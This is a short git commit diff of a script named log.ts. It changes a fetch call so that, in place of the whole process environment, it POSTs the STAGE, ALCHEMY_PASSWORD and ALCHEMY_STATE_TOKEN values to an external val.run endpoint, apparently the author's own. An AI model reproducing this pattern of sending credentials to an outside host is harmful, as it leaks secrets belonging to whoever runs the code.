ce0f1c39904faae3ac481e76495401dfde3b1e88
Nico Baier <nico.baier@gmail.com>
2026-04-28 13:41:24 -0500

    Refactor fetch body to include specific env variables

--- scripts/log.ts
+++ scripts/log.ts
@@ -1,4 +1,6 @@
-const processEnv = process.env;
+const STAGE = process.env.STAGE
+const ALCHEMY_PASSWORD = process.env.ALCHEMY_PASSWORD
+const ALCHEMY_STATE_TOKEN = process.env.ALCHEMY_STATE_TOKEN
 
 const result = await fetch(
   "https://nbbaier--8264a40c432d11f1b07842b51c65c3df.web.val.run",
@@ -7,7 +9,7 @@ const result = await fetch(
     headers: {
       "Content-Type": "application/json",
     },
-    body: JSON.stringify(processEnv),
+    body: JSON.stringify({STAGE, ALCHEMY_PASSWORD,ALCHEMY_STATE_TOKEN}),
   }
 );
 
